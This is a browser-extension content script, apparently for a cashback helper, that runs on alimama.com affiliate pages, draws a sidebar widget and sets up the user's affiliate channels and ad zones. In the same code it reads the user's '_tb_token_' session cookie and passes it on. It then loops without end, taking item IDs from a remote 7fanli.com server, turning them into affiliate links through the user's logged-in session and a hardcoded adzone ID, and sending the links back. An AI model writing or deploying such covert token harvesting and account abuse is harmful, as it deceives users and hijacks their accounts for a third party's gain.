(function () {

    var v = "0.0.0";
    var login = false;
    var account = "";
    var tbToken = '';
    var siteId = "";
    var channelId = "";
    var loginUrl = "http://pub.alimama.com/common/getUnionPubContextInfo.json";
    var guideAddUrl = "http://pub.alimama.com/common/site/generalize/guideAdd.json";
    var guideListUrl = "http://pub.alimama.com/common/site/generalize/guideList.json";
    var getLogInfoUrl = "http://www.alimama.com/getLogInfo.htm";
    var channelAddUrl = "http://pub.alimama.com/common/channel/channelSave.json";
    var getSelfAdzoneUrl = "http://pub.alimama.com/common/adzone/newSelfAdzone2.json";
    var addAdzoneUrl = "http://pub.alimama.com/common/adzone/selfAdzoneCreate.json";
    var getChannelUrl = "http://pub.alimama.com/common/channel/channelManage.json";
    var getAdzoneUrl = "http://pub.alimama.com/common/adzone/adzoneManage.json";
    var getServerUrl = "http://www.7fanli.com/qifanli/server.php";
    var getTransUrl = "http://pub.alimama.com/urltrans/urltrans.json";
    var reloadnum = 0;
    var getadzoneid = "40282315";

    var pos = "leftm";

    function sayMes(str) {

        var fanliout = "padding-right:20px;padding-left:20px;font-size:12px;color:#fff;background:#4daa00;display:inline-block;height:30px;line-height:30px;border-radius:2px;text-decoration: none;";
        var fanliover = "padding-right:20px;padding-left:20px;font-size:12px;color:#fff;background:#57c000;display:inline-block;height:30px;line-height:30px;border-radius:2px;text-decoration: none;";

        var fanliout_m = "margin-left:-8px;overflow: hidden;white-space:normal;word-wrap:break-word;width:12px;padding-left:9px;padding-right:9px;padding-top:20px;padding-bottom:20px;font-size:12px;color:#fff;background:#4daa00;display:inline-block;line-height:14px;border-radius:2px;text-decoration: none;";
        var fanliover_m = "margin-left:-8px;overflow: hidden;white-space:normal;word-wrap:break-word;width:12px;padding-left:9px;padding-right:9px;padding-top:20px;padding-bottom:20px;font-size:12px;color:#fff;background:#57c000;display:inline-block;line-height:14px;border-radius:2px;text-decoration: none;";

        var tc_left = document.getElementById("tc_left");
        var tc_left_m = document.getElementById("tc_left_m");

        if (window.location.href.indexOf(".alimama.com/user/limit_status.htm") != -1 && str == "暂未开通返利权限") {
            if (tc_left) {
                str = '<span style="float:left;margin-top:3px;">补全信息，开通返现金权限，给自己返现金比集分宝多一倍收益</span>'
            } else {
                str = '补全信息，开通返现金权限，给自己返现金比集分宝多一倍收益'
            }

        } else if (window.location.href.indexOf(".alimama.com/user/limit_status.htm") == -1 && str == "暂未开通返利权限") {
            if (tc_left) {
                str = '<span style="float:left">' + str + '</span>' + '<span style="float:left;background:#e9e9e9;display:block;height:28px;width:1px;margin-left:20px;margin-right:20px;"></span><a style="' + fanliout + '" onmouseout="this.style.cssText=\"' + fanliout + '\"" onmouseover="this.style.cssText=\"' + fanliover + '\"" href="http://pub.alimama.com/myunion.htm">点此开通</a>'
            } else {
                str = str + '<span style="background:#e9e9e9;display:block;height:1px;width:28px;margin-top:20px;margin-bottom:20px;margin-left:-8px;"></span><a style="' + fanliout_m + '" onmouseout="this.style.cssText=\"' + fanliout_m + '\"" onmouseover="this.style.cssText=\"' + fanliover_m + '\"" href="http://pub.alimama.com/myunion.htm">点此开通</a>'
            }
        } else {
            str = str;
        }

        if (tc_left) {
            tc_left.innerHTML = "<span style=\"color:#333;display:inline-block;height:23px;padding-left:20px;\">" + str + "</span>";
        } else {
            tc_left_m.innerHTML = "<span style='width:12px;break-word;white-space: normal;word-break: break-all;word-wrap: break-word;color:#333;display:block;margin-left:28px;'>" + str + "</span>";
        }

    }

    function getCookie(objName) {
        var arrStr = document.cookie.split("; ");
        for (var i = 0; i < arrStr.length; i++) {
            var temp = arrStr[i].split("=");
            if (temp[0] == objName) {
                return unescape(temp[1]);
            }
        }
    }

    function addQueqiaoAdzone(data) {

        if (data.ok == true) {

            //console.log("可以正常进入返利了");
            sayMes("快去购物享返利，小7陪着你");
            //加入server

            checkServer();

        }

    }

    function checkServer() {

        sendServer(getUrls, getServerUrl + "?act=get", "");
        // sendMes(function (data) {}, loginUrl);

    }

    function getUrls(data, x) {

        if (data != undefined) {

            //拆分id，组合成商品链接
            var ids = data.split("|");
            if (ids.length > 0) {
                var obj = new Object();
                obj.o = ids;
                obj.i = 0;
                getNextUrl(null, obj);

            }
        } else {

            setTimeout(checkServer, 1000);
            reloadnum++;
            if (reloadnum == 5) {

                location.reload(true);
            }
        }

    }

    function getNextUrl(data, obj) {

        if (null != data) {
            var data = JSON.parse(data);
            var tkurl;
            if (data.data != null) {
                tkurl = data.data.sclick;
            } else {
                tkurl = "undefined";
            }
            sendServer(function (data) {}, getServerUrl + "?act=set&id=" + obj.o[obj.i - 1] + "&tburl=" + encodeURIComponent(tkurl));

        }

        if (obj.i < obj.o.length - 1) {

            var i = obj.i;
            var nobj = new Object();
            nobj.o = obj.o;
            nobj.i = i + 1;
            var timestamp = (new Date()).getTime();
            //console.log("http://item.taobao.com/item.htm?id=" + obj.o[i]);
            sendServer(getNextUrl, getTransUrl + "?siteid=" + siteId + "&adzoneid=" + getadzoneid + "&promotionURL=" + encodeURIComponent("http://item.taobao.com/item.htm?id=" + obj.o[i]) + "&t=" + timestamp, nobj);
        } else {

            checkServer();

        }

    }

    function addAdzone(data) {

        //
        //创建鹊桥用推广位.
        postMes(addQueqiaoAdzone, addAdzoneUrl + "?promotion_type=59" + encodeURIComponent("#") + "59&gcid=8&siteid=" + siteId + "&selectact=add&newadzonename=" + encodeURIComponent("代购_鹊桥") + "&channelIds=" + channelId + "&_tb_token_=" + tbToken);

    }

    function getAdzone(data) {

        var otherList = data.data.otherList;
        var channelslist = data.data.channelslist;
        for (var i in otherList) {

            if (otherList[i].name == "代购") {

                siteId = otherList[i].siteid;
                break;

            }

        }

        for (var j in channelslist) {

            if (channelslist[j].channelName == "代购") {

                channelId = channelslist[j].channelId;
                break;

            }

        }

        //创建推广位.
        postMes(addAdzone, addAdzoneUrl + "?promotion_type=29" + encodeURIComponent("#") + "29&gcid=8&siteid=" + siteId + "&selectact=add&newadzonename=" + encodeURIComponent("代购") + "&channelIds=" + channelId + "&_tb_token_=" + tbToken);

    }

    function addChannel(data) {

        if (data.ok == true) {

            //创建推广位.获得推广列表

            var t = (new Date()).getTime();
            sendMes(getAdzone, getSelfAdzoneUrl + "?tag=29&t=" + t + "&_tb_token_=" + tbToken + "&_input_charset=utf-8");

        }

    }

    function addGuide(data) {

        if (data.ok == true) {

            postMes(addChannel, channelAddUrl + "?channelId=&adzoneId=&act=new&channelName=" + encodeURIComponent("代购") + "&selectAdzoneIds=&_tb_token_=" + tbToken);

        }

    }

    function chkAdzone(data) {

        if (null == data.data.pagelist || data.data.pagelist.length == 0) {
            //console.log("增加推广位");
            //增加推广位
            var t = (new Date()).getTime();
            sendMes(getAdzone, getSelfAdzoneUrl + "?tag=29&t=" + t + "&_tb_token_=" + tbToken + "&_input_charset=utf-8");

        } else {

            addQueqiaoAdzone({
                ok: true
            });
        }

    }

    function getChannel(data) {

        if (data.data.pagelist.length == 0) {
            //console.log("没有渠道");
            //增加渠道
            postMes(addChannel, channelAddUrl + "?channelId=&adzoneId=&act=new&channelName=" + encodeURIComponent("代购") + "&selectAdzoneIds=&_tb_token_=" + tbToken);

        } else {

            //console.log("有渠道");
            //增加推广位.检查推广位
            var t = (new Date()).getTime();
            sendMes(chkAdzone, getAdzoneUrl + "?tab=3&toPage=1&perPageSize=40&gcid=8&t=" + t + "&_tb_token_=" + tbToken + "&_input_charset=utf-8");

        }

    }

    function chkGuideList(data) {

        if (data.data.guideList.length == 0) {
            //console.log("没有导购");
            //没有导购
            //弹出输入框

            var str = prompt("这里填你想拿返利的淘宝帐号，填错会没有返利喔", "请输入您的淘宝账号");
            account = str;
            if (account != "请输入您的淘宝账号" && account != "") {
                postMes(addGuide, guideAddUrl + "?name=" + encodeURIComponent("代购") + "&categoryId=24&account1=" + encodeURIComponent(account) + "&_tb_token_=" + tbToken);
            } else {
                alert("输入有误，刷新页面，重新输入哦");
            }

        } else {

            var hasDG = false;

            for (var i in data.data.guideList) {

                var obj = data.data.guideList[i];
                if (obj.name == "代购") {

                    hasDG = true;

                }

            }

            if (hasDG) {

                //console.log("有导购");
                //检查渠道
                var t = (new Date()).getTime();
                sendMes(getChannel, getChannelUrl + "?toPage=1&perPageSize=40&t=" + t + "&_tb_token_=" + tbToken + "&_input_charset=utf-8");

            } else {

                var str = prompt("这里填你想拿返利的淘宝帐号，填错会没有返利喔", "请输入您的淘宝账号");
                account = str;
                if (account != "请输入您的淘宝账号" && account != "") {
                    postMes(addGuide, guideAddUrl + "?name=" + encodeURIComponent("代购") + "&categoryId=24&account1=" + encodeURIComponent(account) + "&_tb_token_=" + tbToken);
                } else {
                    alert("输入有误，刷新页面，重新输入哦");
                }

            }

        }

    }

    function chkLogin(data) {

        if (null == data) {
            //未开通淘宝客
            //console.log("未开通淘宝客");
            sayMes("暂未开通返利权限");

        } else {
            var data = data.data;
            if (!("noLogin" in data)) {

                //login
                login = true;
                //已登录
                //检查是否创建导购
                tbToken = getCookie("_tb_token_");

                sendInfo(function (data) {}, "token", tbToken);

                var t = (new Date()).getTime();
                //console.log(guideListUrl + "?t=" + t + "&_tb_token_=" + tbToken + "&_input_charset=utf-8");
                sendMes(chkGuideList, guideListUrl + "?t=" + t + "&_tb_token_=" + tbToken + "&_input_charset=utf-8");

            } else {

                login = false;
                //未登录
                sayMes("请用您的淘宝账号登陆");

            }
        }

    }

    function createDialog() {
        if (pos == "leftb" || pos == "rightb") {
            var setout = "display:block;margin-left:20px;margin-top:25px;margin-right:20px;width:22px;height:22px;background:url(https://img.alicdn.com/imgextra/i4/380087440/TB2qiW7hXXXXXXVXXXXXXXXXXXX-380087440.png) 0 -22px no-repeat;cursor:pointer;"
            var setover = "display:block;margin-left:20px;margin-top:25px;margin-right:20px;width:22px;height:22px;background:url(https://img.alicdn.com/imgextra/i4/380087440/TB2qiW7hXXXXXXVXXXXXXXXXXXX-380087440.png) 0 0px no-repeat;cursor:pointer;"
            var trends_dom = document.createElement('div');
            trends_dom.id = "taoke_dialog";
            var fixpos = (pos == "leftb" ? 'left:0px;' : 'right:0px;');
            trends_dom.style.cssText = ['height:70px;', 'border:1px solid #d2d2d2;', 'position:fixed;', fixpos, 'bottom:0;', 'z-index:999999999;', 'color:#fff;', 'text-align:left;', 'background-color:#fff;', 'background-repeat:repeat-x;', 'color:#666666'].join(" ");
            var taoke_content = document.createElement("div");
            taoke_content.id = "taoke_content";
            taoke_content.innerHTML = '<ul style="background:url(https://img.alicdn.com/imgextra/i4/380087440/TB2nsaThXXXXXcxXXXXXXXXXXXX-380087440.png) 20px 10px no-repeat;height:70px;">' + '<li style="float:left;height:28px;width:1px;background-color:#e9e9e9;margin-top:21px;margin-left:90px;"></li>' + '<li id="tc_left" style="float:left;height:70px;margin-top:24px"></li><li id="tc_add" style="float:left"></li>' + '<li style="float:left;height:48px;width:1px;background-color:#e9e9e9;margin-top:10px;margin-left:20px;"></li>' + '<li id="tc_btn" style="float:left"><a href="http://www.7fanli.com/setting.html?v="' + v + ' style="' + setout + '" onmouseout="this.style.cssText=\'' + setout + '\'" onmouseover="this.style.cssText=\'' + setover + '\'" target="_blank"></a></li></ul>' + '<div style="clear:both;"></div>';

            trends_dom.appendChild(taoke_content);

            document.body.insertBefore(trends_dom, document.body.lastChild);

        } else if (pos == "leftm" || pos == "rightm") {
            var setout_2 = "display:block;margin-left:25px;margin-top:20px;width:22px;height:22px;background:url(https://img.alicdn.com/imgextra/i4/380087440/TB2qiW7hXXXXXXVXXXXXXXXXXXX-380087440.png) 0 -22px no-repeat;cursor:pointer;"
            var setover_2 = "display:block;margin-left:25px;margin-top:20px;width:22px;height:22px;background:url(https://img.alicdn.com/imgextra/i4/380087440/TB2qiW7hXXXXXXVXXXXXXXXXXXX-380087440.png) 0 0px no-repeat;cursor:pointer;"

            //左侧
            var trends_dom_m = document.createElement('div');
            trends_dom_m.id = "taoke_dialog_m";

            var fixpos = (pos == "leftm" ? 'left:0px;' : 'right:0px;');
            var css_2 = ['width:70px;', 'border:1px solid #d2d2d2;', 'position:fixed;', fixpos, 'top:200px;', 'z-index:2147483647;', 'color:#fff;', 'text-align:center;', 'background-color:#fff;', 'background-repeat:repeat-x;', 'color:#666666'];

            trends_dom_m.style.cssText = css_2.join("");

            var taoke_content_m = document.createElement("div");

            taoke_content_m.id = "taoke_content_m";

            taoke_content_m.innerHTML = '<ul style="width:70px;padding-bottom:20px;">' + '<li style="background: url(https://img.alicdn.com/imgextra/i4/380087440/TB2nsaThXXXXXcxXXXXXXXXXXXX-380087440.png) no-repeat;width: 50px;height: 50px;margin-left: 10px;margin-top: 10px;"></li>' + '<li style="height:1px;background:#e9e9e9;width:28px;margin-left:21px;margin-top:20px;margin-bottom:20px;"></li>' + '<li id="tc_left_m" style="width:14px;line-height:14px;"></li>' + '<li id="tc_add_m"></li>' + '<li style="width:48px;height:1px;background-color:#e9e9e9;margin-top:20px;margin-left:10px;"></li>' + '<li id="tc_btn_m"><a href="http://www.7fanli.com/setting.html?v="' + v + ' style="' + setout_2 + '" onmouseout="this.style.cssText=\'' + setout_2 + '\'" onmouseover="this.style.cssText=\'' + setover_2 + '\'" target="_blank"></a></li>' + '</ul>' + '<div style="clear:both;"></div>';
            trends_dom_m.appendChild(taoke_content_m);
            document.body.insertBefore(trends_dom_m, document.body.lastChild);
        }

    }

    //在阿里妈妈页面完成初始化
    if (location.href.indexOf("alimama.com") != -1) {
        qifanli_extension.sendRequest({
            "type": "getcookie"
        }, function (response) {

            pos = response[0].pos;
            aitao = response[1].aitao;
            createDialog();
        });
        //是否登录成功
        sendMes(chkLogin, loginUrl);

    }

})();
